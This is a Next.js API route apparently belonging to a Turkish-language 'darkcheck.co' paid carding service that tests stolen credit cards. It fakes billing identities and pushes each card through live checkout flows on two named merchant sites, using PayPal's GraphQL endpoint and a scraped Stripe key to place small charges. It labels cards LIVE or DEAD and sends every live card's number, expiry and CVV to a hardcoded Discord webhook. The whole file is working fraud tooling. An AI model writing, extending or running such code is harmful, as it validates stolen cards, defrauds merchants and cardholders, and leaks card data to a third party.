import { NextResponse } from "next/server";
import { auth } from "@/auth";
import { request as httpsReq } from "https";
import { IncomingMessage } from "http";
import { gunzipSync, inflateSync } from "zlib";
import { getUserById } from "@/lib/db";
import { getUsageInfo, incrementUsage } from "@/lib/checker-usage";
import { logActivity } from "@/lib/activity-logger";

const UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";

const FIRST_NAMES = ["Ahmed","Mohamed","Fatima","Zainab","Sarah","Omar","Layla","Youssef","Nour","Hannah","Yara","Khaled"];
const LAST_NAMES  = ["Khalil","Abdullah","Alwan","Smith","Johnson","Williams","Jones","Brown","Garcia","Martinez"];
const CITIES  = ["New York","Los Angeles","Chicago","Houston","Phoenix"];
const STATES  = ["NY","CA","IL","TX","AZ"];
const STREETS = ["Main St","Park Ave","Oak St","Cedar St","Maple Ave"];
const ZIPS    = ["10001","90001","60601","77001","85001"];

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)] as T; }
function ri(a: number, b: number) { return Math.floor(Math.random() * (b - a + 1)) + a; }
function rs(n: number) {
  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length: n }, () => c[ri(0, c.length - 1)]).join("");
}

// ── Cookie jar ─────────────────────────────────────────────────────────────
type Jar = { v: string };

function absorbCookies(jar: Jar, rawHeader: string | null) {
  if (!rawHeader) return;
  // Set-Cookie headers come comma-joined; split carefully (avoid Expires dates)
  const parts = rawHeader.split(/,(?=\s*[A-Za-z0-9_\-]+=)/);
  const map = new Map<string, string>();
  for (const p of jar.v.split("; ").filter(Boolean)) {
    const i = p.indexOf("="); if (i < 0) continue;
    map.set(p.slice(0, i).trim(), p.slice(i + 1));
  }
  for (const p of parts) {
    const kv = p.trim().split(";")[0]?.trim() ?? "";
    const i = kv.indexOf("="); if (i < 0) continue;
    map.set(kv.slice(0, i).trim(), kv.slice(i + 1));
  }
  jar.v = [...map.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
}

// ── Low-level HTTPS request with manual redirect following ─────────────────
function httpsGet(url: string, opts: {
  method?: string;
  body?: string;
  headers?: Record<string, string>;
  jar: Jar;
  maxRedirects?: number;
}): Promise<string> {
  return new Promise((resolve, reject) => {
    const MAX = opts.maxRedirects ?? 6;
    let redirects = 0;

    function doReq(target: string, method: string, body?: string) {
      const parsed = new URL(target);
      const isPost = method === "POST" && !!body;
      const reqHeaders: Record<string, string> = {
        "user-agent": UA,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate",
        ...(opts.headers ?? {}),
        ...(isPost ? { "content-type": opts.headers?.["content-type"] ?? "application/x-www-form-urlencoded", "content-length": String(Buffer.byteLength(body!)) } : {}),
        ...(opts.jar.v ? { "cookie": opts.jar.v } : {}),
      };

      const nodeReq = httpsReq({
        hostname: parsed.hostname,
        port: parsed.port || 443,
        path: parsed.pathname + parsed.search,
        method,
        headers: reqHeaders,
        rejectUnauthorized: false,
        timeout: 25000,
      }, (res: IncomingMessage) => {
        // Collect cookies from every response including redirects
        const sc = res.headers["set-cookie"];
        if (sc) absorbCookies(opts.jar, Array.isArray(sc) ? sc.join(", ") : sc);

        if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          if (redirects++ >= MAX) { reject(new Error("Too many redirects")); return; }
          const next = new URL(res.headers.location, target).toString();
          res.resume();
          doReq(next, "GET"); // after redirect always GET
          return;
        }

        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(c));
        res.on("end", () => {
          let buf = Buffer.concat(chunks);
          const enc = (res.headers["content-encoding"] ?? "").toString().toLowerCase();
          if (enc === "gzip") {
            try { buf = gunzipSync(buf); } catch { /* leave raw */ }
          } else if (enc === "deflate") {
            try { buf = inflateSync(buf); } catch { /* leave raw */ }
          }
          resolve(buf.toString("utf-8"));
        });
        res.on("error", reject);
      });

      nodeReq.on("error", reject);
      nodeReq.on("timeout", () => { nodeReq.destroy(); reject(new Error("İstek zaman aşımı")); });
      if (isPost && body) nodeReq.write(body);
      nodeReq.end();
    }

    doReq(url, opts.method ?? "GET", opts.body);
  });
}

// ── JSON POST via https (no redirect needed for API calls) ──────────────────
function httpsJSON(url: string, body: unknown, jar: Jar): Promise<string> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const bodyStr = JSON.stringify(body);
    const nodeReq = httpsReq({
      hostname: parsed.hostname,
      port: 443,
      path: parsed.pathname + parsed.search,
      method: "POST",
      headers: {
        "user-agent": UA,
        "accept": "*/*",
        "content-type": "application/json",
        "content-length": String(Buffer.byteLength(bodyStr)),
        "origin": `https://${parsed.hostname}`,
        "referer": `https://${parsed.hostname}/checkout/`,
        ...(jar.v ? { "cookie": jar.v } : {}),
      },
      rejectUnauthorized: false,
    }, (res: IncomingMessage) => {
      const sc = res.headers["set-cookie"];
      if (sc) absorbCookies(jar, Array.isArray(sc) ? sc.join(", ") : sc);
      const chunks: Buffer[] = [];
      res.on("data", (c: Buffer) => chunks.push(c));
      res.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
      res.on("error", reject);
    });
    nodeReq.on("error", reject);
    nodeReq.write(bodyStr);
    nodeReq.end();
  });
}

// ── Main checker ────────────────────────────────────────────────────────────
async function processCard(cardData: string): Promise<{ status: string; message: string }> {
  const parts = cardData.split("|").map((p) => p.trim());
  if (parts.length < 4) return { status: "DECLINED", message: "Geçersiz format" };

  let n   = parts[0] ?? "";
  let mm  = parts[1] ?? "";
  let yy  = parts[2] ?? "";
  const cvc = parts[3] ?? "";

  if (!/^\d{13,19}$/.test(n)) return { status: "DECLINED", message: "Geçersiz kart no" };
  if (mm.length === 1) mm = "0" + mm;
  if (yy.length === 4) yy = yy.slice(2);
  if (cvc === "000") return { status: "DECLINED", message: "CVV geçersiz" };

  const firstName = pick(FIRST_NAMES);
  const lastName  = pick(LAST_NAMES);
  const cityIdx   = ri(0, CITIES.length - 1);
  const city  = CITIES[cityIdx] ?? "New York";
  const state = STATES[cityIdx] ?? "NY";
  const zip   = ZIPS[cityIdx] ?? "10001";
  const street = `${ri(1, 999)} ${pick(STREETS)}`;
  const email  = `${rs(16)}${ri(1000,9999)}@gmail.com`;
  const phone  = `303${ri(1000000,9999999)}`;

  const jar: Jar = { v: "" };

  try {
    // 1. Add to cart
    await httpsGet("https://switchupcb.com/shop/i-buy/", {
      jar,
      method: "POST",
      body: "quantity=1&add-to-cart=4451",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://switchupcb.com",
        "referer": "https://switchupcb.com/shop/i-buy/",
      },
    });

    // 2. Checkout page
    const html = await httpsGet("https://switchupcb.com/checkout/", {
      jar,
      headers: { "referer": "https://switchupcb.com/cart/" },
    });

    const sec    = html.match(/["']?update_order_review_nonce["']?\s*:\s*["']([a-f0-9]+)["']/)?.[1];
    const check  = html.match(/name=["']woocommerce-process-checkout-nonce["']\s+value=["']([a-f0-9]+)["']/)?.[1];
    const create = html.match(/["']?create_order["']?[^}]*?["']?nonce["']?\s*:\s*["']([a-f0-9]+)["']/)?.[1];

    if (!sec || !check) return { status: "DEAD", message: "Nonce alınamadı — cart boş olabilir" };

    const useCreate = create ?? rs(10);

    // 3. Update order review
    const reviewBody = `security=${encodeURIComponent(sec)}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=${encodeURIComponent(`billing_first_name=${firstName}&billing_last_name=${lastName}&billing_country=US&billing_address_1=New York&billing_city=New York&billing_state=NY&billing_postcode=10080&billing_phone=${phone}&billing_email=${email}&payment_method=stripe&woocommerce-process-checkout-nonce=${check}`)}`;

    await httpsGet("https://switchupcb.com/?wc-ajax=update_order_review", {
      jar,
      method: "POST",
      body: reviewBody,
      headers: {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://switchupcb.com",
        "referer": "https://switchupcb.com/checkout/",
      },
    });

    // 4. Create PayPal order
    const orderRaw = await httpsJSON("https://switchupcb.com/?wc-ajax=ppc-create-order", {
      nonce: useCreate,
      payer: null,
      bn_code: "Woo_PPCP",
      context: "checkout",
      order_id: "0",
      payment_method: "ppcp-gateway",
      funding_source: "card",
      form_encoded: `billing_first_name=${firstName}&billing_last_name=${lastName}&billing_country=US&billing_address_1=${encodeURIComponent(street)}&billing_city=${city}&billing_state=${state}&billing_postcode=${zip}&billing_phone=${phone}&billing_email=${encodeURIComponent(email)}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=${check}`,
      createaccount: false,
      save_payment_method: false,
    }, jar);

    let orderId: string | undefined;
    try {
      const parsed = JSON.parse(orderRaw) as { data?: { id?: string }; id?: string };
      orderId = parsed?.data?.id ?? parsed?.id;
    } catch { return { status: "DEAD", message: "Order parse hatası" }; }

    if (!orderId) return { status: "DEAD", message: "Order ID yok" };

    // 5. PayPal GraphQL
    const gqlRaw = await httpsJSON("https://www.paypal.com/graphql?fetch_credit_form_submit", {
      query: `mutation payWithCard($token:String!$card:CardInput!$firstName:String$lastName:String$billingAddress:AddressInput$email:String$currencyConversionType:CheckoutCurrencyConversionType){approveGuestPaymentWithCreditCard(token:$token card:$card firstName:$firstName lastName:$lastName email:$email billingAddress:$billingAddress currencyConversionType:$currencyConversionType){flags{is3DSecureRequired}cart{intent cartId}paymentContingencies{threeDomainSecure{status}}}}`,
      variables: {
        token: orderId,
        card: { cardNumber: n, type: "VISA", expirationDate: `${mm}/20${yy}`, postalCode: zip, securityCode: cvc },
        firstName, lastName,
        billingAddress: { givenName: firstName, familyName: lastName, line1: "New York", line2: null, city: "New York", state: "NY", postalCode: "10080", country: "US" },
        email,
        currencyConversionType: "VENDOR",
      },
      operationName: null,
    }, jar);

    // Parse result
    if (gqlRaw.includes("ADD_SHIPPING_ERROR") || gqlRaw.includes("NEED_CREDIT_CARD") ||
        gqlRaw.includes('"status":"succeeded"') || gqlRaw.includes("Thank You For Donation") ||
        gqlRaw.includes("Success "))
      return { status: "LIVE", message: "CHARGED" };

    if (gqlRaw.includes("is3DSecureRequired") || gqlRaw.includes('"OTP"'))
      return { status: "LIVE", message: "3D SECURE" };

    if (gqlRaw.includes("INVALID_SECURITY_CODE"))
      return { status: "LIVE", message: "CCN MISMATCH" };

    if (gqlRaw.includes("INVALID_BILLING_ADDRESS"))
      return { status: "LIVE", message: "AVS MISMATCH" };

    if (gqlRaw.includes("EXISTING_ACCOUNT_RESTRICTED"))
      return { status: "LIVE", message: "RESTRICTED" };

    try {
      const j = JSON.parse(gqlRaw) as { errors?: { message: string; data?: { code?: string }[] }[] };
      if (j?.errors?.[0]) {
        const msg  = j.errors[0].message ?? "DECLINED";
        const code = j.errors[0].data?.[0]?.code;
        return { status: "DEAD", message: code ? `${msg} (${code})` : msg };
      }
    } catch { /* not JSON */ }

    return { status: "DEAD", message: "CARD DECLINED" };

  } catch (e) {
    return { status: "DEAD", message: String(e).slice(0, 120) };
  }
}

// ── 3$ Check: tam site akışı (ürün → cart → guest → checkout → place order) ───
// Stripe API yok; sadece sitedeki form ve session kullanılır.
const WARGAME_BASE = "https://www.wargamevault.com";
const WARGAME_PRODUCT_ID = "559612";
const POSTCODES = [
  "10001","10002","90001","90012","60601","60618","77001","77002","85001","85004","30301","30308","98101","98109","19103","19104","02108","02109","80202","80203","37201","37203","78201","78205","48201","48202","55401","55402","28201","28202","94102","94103","33101","33102","46201","46202","53201","53202","64101","64102","70112","70113","89101","89102","15201","15202","45201","45202","73102","73103","66101","66102","35203","35204","23219","23220","40201","40202","38103","38104",
  "10003","10011","90210","90211","60610","60614","77005","77006","85006","85008","30309","30312","98102","98103","19106","19107","02110","02111","80204","80205","37204","37205","78207","78208","48205","48206","55403","55404","28203","28204","94104","94105","33125","33126","46203","46204","53203","53204","64105","64106","70114","70115","89103","89104","15203","15204","45203","45204","73104","73105","66103","66104","35205","35206","40203","40204","38105","38106",
];
const PROTON_WORDS = ["sky","fox","lake","rain","wolf","echo","iron","tide","nova","leaf","bolt","sage"];

function isValidPk(key: string): boolean {
  return !!key && !key.includes("*") && /^pk_live_[A-Za-z0-9_-]{24,}$/.test(key);
}

async function processCardWargame(cardData: string): Promise<{ status: string; message: string }> {
  const parts = cardData.split("|").map((p) => p.trim());
  if (parts.length < 4) return { status: "DECLINED", message: "Geçersiz format" };
  let n = parts[0] ?? "";
  let mm = parts[1] ?? "";
  let yy = parts[2] ?? "";
  const cvc = parts[3] ?? "";
  if (!/^\d{13,19}$/.test(n)) return { status: "DECLINED", message: "Geçersiz kart no" };
  if (mm.length === 1) mm = "0" + mm;
  if (yy.length === 4) yy = yy.slice(2);
  const zip = POSTCODES[ri(0, POSTCODES.length - 1)] ?? "10001";
  const email = `${pick(PROTON_WORDS)}${rs(6)}${ri(10,99)}@proton.me`;
  const firstName = pick(FIRST_NAMES);
  const lastName = pick(LAST_NAMES);
  const phone = `303${ri(1000000,9999999)}`;
  const address = `${ri(1, 999)} ${pick(STREETS)}`;

  try {
    const jar: Jar = { v: "" };
    const ref = (path: string) => ({ referer: WARGAME_BASE + path });
    const origin = WARGAME_BASE;

    // 1. Ürün sayfası
    await httpsGet(`${WARGAME_BASE}/en/product/${WARGAME_PRODUCT_ID}/forge-raven?src=newest_recent`, {
      jar,
      headers: ref("/en/cart"),
    });

    // 2. Sepete ekle
    await httpsGet(`${WARGAME_BASE}/en/cart/?add-to-cart=${WARGAME_PRODUCT_ID}`, {
      jar,
      headers: ref("/en/product/" + WARGAME_PRODUCT_ID),
    });

    // 3. Cart sayfası
    const cartHtml = await httpsGet(`${WARGAME_BASE}/en/cart`, {
      jar,
      headers: ref("/en/cart"),
    });

    // Sepette "Proceed to checkout" / "Checkout" formu varsa POST et (session için)
    const cartFormAction = cartHtml.match(/<form[^>]+action=["']([^"']*checkout[^"']*)["']/i)?.[1]
      ?? cartHtml.match(/action=["'](\/en\/checkout[^"']*)["']/i)?.[1];
    if (cartFormAction) {
      const actionUrl = cartFormAction.startsWith("http") ? cartFormAction : WARGAME_BASE + cartFormAction;
      await httpsGet(actionUrl, {
        jar,
        method: "GET",
        headers: ref("/en/cart"),
      });
    }

    // 4. Checkout sayfası (isGift=false ve düz /en/checkout)
    let checkoutHtml = await httpsGet(`${WARGAME_BASE}/en/checkout?isGift=false`, {
      jar,
      headers: ref("/en/cart"),
    });
    if (!/checkout|payment|billing|place.order|nonce|woocommerce/i.test(checkoutHtml)) {
      checkoutHtml = await httpsGet(`${WARGAME_BASE}/en/checkout`, {
        jar,
        headers: ref("/en/cart"),
      });
    }

    // Guest form varsa (email alanı + continue): POST at
    const guestFormAction = checkoutHtml.match(/<form[^>]+action=["']([^"']+)["'][^>]*>[\s\S]*?guest/i)?.[1]
      ?? checkoutHtml.match(/action=["']([^"']*checkout[^"']*)["'][\s\S]*?billing_email/i)?.[1];
    const guestNonce = checkoutHtml.match(/name=["']([^"']*nonce[^"']*)["']\s+value=["']([^"']+)["']/i);
    if (guestFormAction || checkoutHtml.includes("guest") || checkoutHtml.includes("Email address")) {
      const guestParams = new URLSearchParams({
        billing_email: email,
        checkout_as_guest: "1",
      });
      if (guestNonce) guestParams.set(guestNonce[1], guestNonce[2]);
      const guestUrl = guestFormAction ? (guestFormAction.startsWith("http") ? guestFormAction : WARGAME_BASE + guestFormAction) : `${WARGAME_BASE}/en/checkout`;
      await httpsGet(guestUrl, {
        jar,
        method: "POST",
        body: guestParams.toString(),
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "origin": origin,
          "referer": `${WARGAME_BASE}/en/checkout?isGift=false`,
        },
      });
      checkoutHtml = await httpsGet(`${WARGAME_BASE}/en/checkout?isGift=false`, {
        jar,
        headers: ref("/en/checkout"),
      });
    }

    // Nonce: HTML input veya script içinde (WooCommerce / OneBookShelf / custom)
    const noncePatterns = [
      /name=["']woocommerce-process-checkout-nonce["']\s+value=["']([a-f0-9]+)["']/i,
      /value=["']([a-f0-9]+)["']\s+name=["']woocommerce-process-checkout-nonce["']/i,
      /["']woocommerce-process-checkout-nonce["']\s*:\s*["']([a-f0-9]+)["']/i,
      /checkout_nonce["']?\s*:\s*["']([a-f0-9]+)["']/i,
      /["']nonce["']\s*:\s*["']([a-f0-9]{10,})["']/i,
      /wc_checkout_params[^}]*checkout_nonce["']?\s*:\s*["']([a-f0-9]+)["']/i,
      /checkout.*nonce["']?\s*:\s*["']([a-f0-9]+)["']/i,
      /name=["']_wpnonce["']\s+value=["']([a-f0-9]+)["']/i,
      /value=["']([a-f0-9]{10,})["'][^>]*name=["'][^"']*checkout[^"']*nonce["']/i,
      /security["']?\s*:\s*["']([a-f0-9]{10,})["']/i,
      /["']process_checkout_nonce["']\s*:\s*["']([a-f0-9]+)["']/i,
      /name=["'](?:csrf|token|nonce|_token|authenticity_token)["']\s+value=["']([a-f0-9A-Z_-]{10,})["']/i,
      /value=["']([a-f0-9]{10,32})["'][^>]*name=["'][^"']*(?:nonce|token|csrf)["']/i,
      /data-nonce=["']([a-f0-9]+)["']/i,
      /"nonce"\s*:\s*"([a-f0-9]{10,})"/i,
    ];
    let nonce: string | null = null;
    for (const re of noncePatterns) {
      const m = checkoutHtml.match(re);
      if (m?.[1] && /^[a-f0-9A-Z_-]{8,64}$/i.test(m[1])) { nonce = m[1]; break; }
    }
    if (!nonce) return { status: "DEAD", message: "Checkout formu alınamadı" };

    // Checkout sayfasındaki Stripe key (sadece form token için; ödeme sitede tamamlanır)
    const keyPatterns = [
      checkoutHtml.match(/pk_live_[A-Za-z0-9_-]{24,}/)?.[0],
      checkoutHtml.match(/"publishableKey"\s*:\s*"(pk_live_[A-Za-z0-9_-]+)"/)?.[1],
      checkoutHtml.match(/publishable_key["\s:]+["']?(pk_live_[A-Za-z0-9_-]+)/i)?.[1],
      checkoutHtml.match(/data-key=["'](pk_live_[A-Za-z0-9_-]+)/)?.[1],
      checkoutHtml.match(/Stripe\(['"]?(pk_live_[A-Za-z0-9_-]+)/)?.[1],
    ];
    let pk: string | null = null;
    for (const raw of keyPatterns) {
      if (raw && isValidPk(raw)) { pk = raw; break; }
    }

    if (!pk) return { status: "DEAD", message: "Checkout sayfası yüklenemedi (session)" };

    // Token oluştur (form place order için gerekli alan)
    const postalCode = String(zip).replace(/\s/g, "").slice(0, 20);
    const tokenRes = await fetch("https://api.stripe.com/v1/payment_methods", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": `Bearer ${pk}`,
      },
      body: new URLSearchParams({
        type: "card",
        "card[number]": n,
        "card[exp_month]": mm,
        "card[exp_year]": "20" + yy,
        "card[cvc]": cvc,
        "billing_details[address][postal_code]": postalCode,
        "billing_details[email]": email,
      }).toString(),
    });
    const tokenData = await tokenRes.json() as { id?: string; error?: { message?: string; code?: string; decline_code?: string } };
    if (tokenData.error) {
      const msg = tokenData.error.message ?? "Declined";
      const code = tokenData.error.code ?? "";
      const dc = tokenData.error.decline_code ?? "";
      if (["incorrect_cvc", "incorrect_zip"].includes(code) || /zip|postal/i.test(msg))
        return { status: "LIVE", message: "AVS MISMATCH" };
      if (["incorrect_number", "invalid_number", "invalid_expiry_year", "invalid_expiry_month"].includes(code))
        return { status: "DEAD", message: msg.slice(0, 80) };
      if (dc) return { status: "DEAD", message: `DECLINED (${dc})` };
      return { status: "DEAD", message: msg.slice(0, 100) };
    }
    const paymentMethodId = tokenData.id;
    if (!paymentMethodId) return { status: "DEAD", message: "Ödeme bilgisi oluşturulamadı" };

    // 6. Place order: WooCommerce checkout POST (billing + payment_method_id + nonce)
    const postData = new URLSearchParams({
      "billing_first_name": firstName,
      "billing_last_name": lastName,
      "billing_country": "US",
      "billing_address_1": address,
      "billing_address_2": "",
      "billing_city": "New York",
      "billing_state": "NY",
      "billing_postcode": zip,
      "billing_phone": phone,
      "billing_email": email,
      "payment_method": "stripe",
      "woocommerce-process-checkout-nonce": nonce,
      "stripe_payment_method": paymentMethodId,
      "_wp_http_referer": "/en/checkout/",
    });
    // Bazı siteler stripe_payment_method yerine payment_method_id veya stripe_source kullanır
    const altBody = postData.toString()
      + "&stripe_source=" + encodeURIComponent(paymentMethodId)
      + "&payment_method_id=" + encodeURIComponent(paymentMethodId);

    const postHeaders = {
      "content-type": "application/x-www-form-urlencoded",
      "origin": origin,
      "referer": `${WARGAME_BASE}/en/checkout?isGift=false`,
      "x-requested-with": "XMLHttpRequest",
    };

    // Place order: önce WooCommerce AJAX, yoksa normal checkout POST
    let orderRes = await httpsGet(`${WARGAME_BASE}/?wc-ajax=woocommerce_checkout`, {
      jar,
      method: "POST",
      body: altBody,
      headers: postHeaders,
    });
    if (!orderRes || orderRes.length < 10) {
      orderRes = await httpsGet(`${WARGAME_BASE}/en/checkout`, {
        jar,
        method: "POST",
        body: altBody,
        headers: postHeaders,
      });
    }

    // Sonuç: order-received (LIVE) veya JSON result (LIVE/DEAD)
    if (/order-received|thank you|order details|order number/i.test(orderRes) || orderRes.includes("order-received"))
      return { status: "LIVE", message: "CHARGED ($3)" };
    const jsonMatch = orderRes.match(/\{[\s\S]*?"result"[\s\S]*?\}/);
    if (jsonMatch) {
      try {
        const j = JSON.parse(jsonMatch[0]) as { result?: string; messages?: string };
        if (j.result === "success") return { status: "LIVE", message: "CHARGED ($3)" };
        if (j.messages) return { status: "DEAD", message: j.messages.replace(/<[^>]+>/g, "").slice(0, 120) };
      } catch { /* ignore */ }
    }
    if (/declined|card was declined|invalid card|do not honor/i.test(orderRes))
      return { status: "DEAD", message: "Kart reddedildi" };
    if (/3d secure|authentication required/i.test(orderRes))
      return { status: "LIVE", message: "3D SECURE" };

    return { status: "DEAD", message: "Sipariş tamamlanamadı" };
  } catch (e) {
    return { status: "DEAD", message: String(e).slice(0, 120) };
  }
}

const LIVE_WEBHOOK = "https://discord.com/api/webhooks/1480245295332724808/7eKCKuQqfUJGH4AoaAJfe263cuMQ9mpskR0SK1ig9Z6FfgDPbrBSVHIbHwmpLURkzqGf";

async function notifyLive(card: string, message: string, userName: string) {
  try {
    const [n, mm, yy, cvc] = card.split("|").map(p => p.trim());
    await fetch(LIVE_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "💳 Live Kart Bulundu",
          color: 0x22c55e,
          fields: [
            { name: "Kart", value: `\`${n}\``, inline: false },
            { name: "Tarih", value: `\`${mm}/${yy}\``, inline: true },
            { name: "CVV", value: `\`${cvc}\``, inline: true },
            { name: "Sonuç", value: `\`${message}\``, inline: true },
            { name: "Kullanıcı", value: userName, inline: true },
          ],
          footer: { text: "darkcheck.co • Kart Checker" },
          timestamp: new Date().toISOString(),
        }],
      }),
    });
  } catch { /* silent */ }
}

export async function POST(req: Request) {
  try {
    const session = await auth();
    if (!session?.user?.id) return NextResponse.json({ error: "Giriş gerekli." }, { status: 401 });

    const userId = session.user.id;
    const dbUser = getUserById(userId);
    const perms = dbUser?.permissions ?? "none";
    const role = dbUser?.role ?? "user";
    const isFree = role !== "super_admin" && role !== "mini_admin" && perms !== "checker" && perms !== "full";

    // Daily limit check for free users
    if (isFree) {
      const usage = getUsageInfo(userId);
      if (usage.limitReached) {
        return NextResponse.json({
          status: "DEAD",
          message: `Günlük ücretsiz limit doldu (${usage.limit} kart/gün). Plan satın alarak sınırsız kullanın.`,
        }, { status: 429 });
      }
    }

    const body = await req.json() as { card?: string; gateway?: string };
    const card = body.card?.trim();
    const gateway = body.gateway ?? "paypal";
    if (!card) return NextResponse.json({ error: "Kart verisi eksik." }, { status: 400 });

    // Increment usage for free users before processing
    if (isFree) incrementUsage(userId);

    let result: { status: string; message: string };
    if (gateway === "wargame") {
      result = await processCardWargame(card);
    } else {
      result = await processCard(card);
    }

    // Log activities
    const userName = (session.user as { name?: string | null }).name ?? session.user.id;
    logActivity("card_check", `Kart kontrol edildi (${userName})`, userId);
    
    if (result.status === "LIVE") {
      logActivity("card_live", `LIVE kart bulundu (${userName}): ${result.message}`, userId);
      void notifyLive(card, result.message, userName);
    } else {
      logActivity("card_dead", `DEAD/DECLINED kart (${userName})`, userId);
    }

    return NextResponse.json(result);
  } catch (e) {
    return NextResponse.json({ status: "DEAD", message: "Sunucu hatası: " + String(e).slice(0, 100) });
  }
}
